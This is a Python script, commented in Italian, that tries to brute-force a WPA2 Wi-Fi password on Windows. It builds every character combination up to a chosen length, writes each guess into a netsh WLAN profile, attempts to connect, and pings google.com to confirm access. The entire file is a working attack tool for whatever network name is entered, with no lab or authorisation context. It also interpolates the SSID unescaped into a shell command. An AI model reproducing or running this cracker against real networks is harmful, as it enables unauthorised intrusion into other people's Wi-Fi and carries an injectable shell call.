import subprocess
import time
import os
import itertools
from typing import Generator

def create_temp_profile(ssid: str, password: str) -> None:
    """Crea un profilo XML temporaneo per la connessione Wi-Fi"""
    xml_content = f'''<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{ssid}</name>
    <SSIDConfig>
        <SSID>
            <name>{ssid}</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>{password}</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>'''

    with open("temp_profile.xml", "w", encoding="utf-8") as f:
        f.write(xml_content)

def connect_to_wifi(ssid: str, password: str) -> bool:
    """Aggiunge il profilo Wi-Fi e tenta la connessione"""
    try:
        # Aggiungi il profilo
        cmd = 'netsh wlan add profile filename="temp_profile.xml"'
        subprocess.run(cmd, shell=True, capture_output=True, check=True)

        # Connetti alla rete
        cmd = f'netsh wlan connect name="{ssid}"'
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

        return result.returncode == 0
    except Exception as e:
        print(f"Errore durante la connessione: {e}")
        return False

def ping_google(timeout: int = 10) -> bool:
    """Esegue un ping a google.com e restituisce True se ha successo"""
    try:
        result = subprocess.run(['ping', '-n', '1', 'google.com'], 
                              capture_output=True, text=True, timeout=timeout)
        return result.returncode == 0
    except:
        return False

def wait_and_ping() -> bool:
    """Aspetta un po' e poi esegue il ping per verificare la connessione"""
    print("Attendo la stabilizzazione della connessione...")
    time.sleep(5)  # Aspetta 5 secondi per permettere la stabilizzazione
    print("Verifica connessione internet...")
    return ping_google()

def generate_passwords(charset: str, min_length: int, max_length: int) -> Generator[str, None, None]:
    """Genera password brute-force con lunghezze crescenti"""
    for length in range(min_length, max_length + 1):
        for combo in itertools.product(charset, repeat=length):
            yield ''.join(combo)

def main():
    ssid = input("Inserisci il nome della rete Wi-Fi (SSID): ")
    
    # Definizione del set di caratteri per il brute-force
    charset = input("Inserisci il set di caratteri (es. abcdefghijklmnopqrstuvwxyz0123456789): ").strip()
    if not charset:
        charset = "abcdefghijklmnopqrstuvwxyz0123456789"
    
    # Definizione della lunghezza minima e massima
    try:
        min_length = int(input("Inserisci la lunghezza minima della password: "))
        max_length = int(input("Inserisci la lunghezza massima della password: "))
    except ValueError:
        print("Valori non validi, uso impostazioni predefinite")
        min_length = 1
        max_length = 4

    print(f"\nInizio del brute-force per la rete '{ssid}'")
    print(f"Charset: {charset}")
    print(f"Lunghezza: {min_length}-{max_length}")
    
    # Calcola il numero totale di combinazioni
    total_combinations = sum(len(charset) ** i for i in range(min_length, max_length + 1))
    print(f"Numero totale di combinazioni: {total_combinations:,}")
    
    # Inizia il brute-force
    password_generator = generate_passwords(charset, min_length, max_length)
    attempts = 0
    found = False
    
    for password in password_generator:
        attempts += 1
        print(f"\nTentativo {attempts}: Provo password '{password}'")
        
        create_temp_profile(ssid, password)
        success = connect_to_wifi(ssid, password)

        if success:
            print(f"✅ Connessione riuscita con la password: {password}")
            
            # Verifica la connessione internet
            if wait_and_ping():
                print("✅ Connessione internet stabilita con successo")
                try:
                    os.remove("temp_profile.xml")
                except:
                    pass
                found = True
                break
            else:
                print("⚠️  Connessione riuscita ma nessuna connessione internet disponibile")
                print("Continuo con il prossimo tentativo...")
                
        try:
            os.remove("temp_profile.xml")
        except:
            pass

        # Piccola pausa tra i tentativi
        time.sleep(0.5)

    if not found:
        print("\n❌ Brute-force completato senza trovare password valide")
    else:
        print(f"\n🎉 Password trovata in {attempts} tentativi!")

if __name__ == "__main__":
    main()